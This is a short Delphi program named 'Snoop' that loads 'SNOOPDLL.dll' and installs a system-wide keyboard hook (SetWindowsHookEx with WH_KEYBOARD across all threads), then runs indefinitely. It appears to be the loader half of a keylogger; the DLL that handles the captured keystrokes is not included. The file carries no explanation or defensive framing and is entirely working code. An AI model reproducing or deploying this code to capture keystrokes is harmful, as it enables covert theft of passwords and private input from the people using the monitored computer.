program Snoop;

uses
  Windows;

type
  TdllProc = procedure;

var
  Hook : HHOOK;
  DllInstance : DWORD;
  HookProc : FARPROC;
  StartProc, EndProc : TDllProc;

Begin
  DllInstance := LoadLibrary('SNOOPDLL.dll');
  HookProc := GetProcAddress(DllInstance, 'HookProcedure');
  StartProc := GetProcAddress(DllInstance, 'SetHook');
  EndProc := GetProcAddress(DllInstance, 'EndHook');
  StartProc;
  Hook := SetWindowsHookEx(WH_KEYBOARD, HookProc, DllInstance, 0);
  Sleep(INFINITE);
  UnhookWindowsHookEx(Hook);
  EndProc;
  FreeLibrary(DllInstance);
end.

